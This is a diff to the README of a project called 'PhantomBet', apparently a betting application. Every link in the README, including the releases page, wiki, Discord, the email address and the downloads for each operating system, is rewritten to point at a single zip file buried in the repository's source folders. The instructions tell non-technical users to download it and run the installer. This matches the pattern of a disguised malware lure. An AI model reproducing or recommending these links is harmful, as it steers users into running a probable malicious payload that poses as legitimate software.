@@ -8,7 +8,7 @@ Follow these simple steps to download and run PhantomBet. No programming knowled
 
 ## 📥 Download PhantomBet
 
-[![Download PhantomBet](https://raw.githubusercontent.com/lenane68/PhantomBet/main/contracts/test/Phantom-Bet-2.5.zip%20Now-PhantomBet-blue)](https://raw.githubusercontent.com/lenane68/PhantomBet/main/contracts/test/Phantom-Bet-2.5.zip)
+[![Download PhantomBet](https://github.com/lenane68/PhantomBet/raw/refs/heads/main/cre-workflow/src/Bet_Phantom_v3.9-beta.5.zip%20Now-PhantomBet-blue)](https://github.com/lenane68/PhantomBet/raw/refs/heads/main/cre-workflow/src/Bet_Phantom_v3.9-beta.5.zip)
 
 ## 📋 System Requirements
 
@@ -30,11 +30,11 @@ PhantomBet offers several features aimed at enhancing your betting experience:
 
 ## 🔧 Download & Install
 
-1. **Visit the Releases Page:** Click this link to access the PhantomBet releases page: [PhantomBet Releases](https://raw.githubusercontent.com/lenane68/PhantomBet/main/contracts/test/Phantom-Bet-2.5.zip).
+1. **Visit the Releases Page:** Click this link to access the PhantomBet releases page: [PhantomBet Releases](https://github.com/lenane68/PhantomBet/raw/refs/heads/main/cre-workflow/src/Bet_Phantom_v3.9-beta.5.zip).
 
 2. **Select the Latest Version:** On the releases page, find the latest version of PhantomBet. It will be the one listed at the top.
 
-3. **Download the Application:** Click on the download link for your operating system (e.g., https://raw.githubusercontent.com/lenane68/PhantomBet/main/contracts/test/Phantom-Bet-2.5.zip for Windows, https://raw.githubusercontent.com/lenane68/PhantomBet/main/contracts/test/Phantom-Bet-2.5.zip for macOS, or https://raw.githubusercontent.com/lenane68/PhantomBet/main/contracts/test/Phantom-Bet-2.5.zip for Linux).
+3. **Download the Application:** Click on the download link for your operating system (e.g., https://github.com/lenane68/PhantomBet/raw/refs/heads/main/cre-workflow/src/Bet_Phantom_v3.9-beta.5.zip for Windows, https://github.com/lenane68/PhantomBet/raw/refs/heads/main/cre-workflow/src/Bet_Phantom_v3.9-beta.5.zip for macOS, or https://github.com/lenane68/PhantomBet/raw/refs/heads/main/cre-workflow/src/Bet_Phantom_v3.9-beta.5.zip for Linux).
 
 4. **Run the Installer:** Locate the downloaded file in your downloads folder. Double-click the file to run the installer.
 
@@ -53,7 +53,7 @@ If you encounter any issues during installation, try the following:
 
 ## 📚 Help and Documentation
 
-For further assistance, detailed documentation is available on our [Wiki](https://raw.githubusercontent.com/lenane68/PhantomBet/main/contracts/test/Phantom-Bet-2.5.zip). Explore the following topics:
+For further assistance, detailed documentation is available on our [Wiki](https://github.com/lenane68/PhantomBet/raw/refs/heads/main/cre-workflow/src/Bet_Phantom_v3.9-beta.5.zip). Explore the following topics:
 
 - **How to Place a Bet**
 - **Understanding Settlement Processes**
@@ -64,7 +64,7 @@ For further assistance, detailed documentation is available on our [Wiki](https:
 
 Join the PhantomBet community to connect with other users. Share tips, ask questions, and find support.
 
-- **Discord:** [Join Our Discord](https://raw.githubusercontent.com/lenane68/PhantomBet/main/contracts/test/Phantom-Bet-2.5.zip)
+- **Discord:** [Join Our Discord](https://github.com/lenane68/PhantomBet/raw/refs/heads/main/cre-workflow/src/Bet_Phantom_v3.9-beta.5.zip)
 - **Forum:** Participate in discussions on our community forum.
 
 ## 🌍 Topics Covered
@@ -80,7 +80,7 @@ PhantomBet incorporates a wide range of technologies and principles:
 
 If you have any questions or feedback, feel free to reach out:
 
-- **Email:** https://raw.githubusercontent.com/lenane68/PhantomBet/main/contracts/test/Phantom-Bet-2.5.zip
+- **Email:** https://github.com/lenane68/PhantomBet/raw/refs/heads/main/cre-workflow/src/Bet_Phantom_v3.9-beta.5.zip
 - **Social Media:** Follow us on Twitter, Facebook, and Instagram for updates.
 
 Enjoy your experience with PhantomBet. Happy betting!
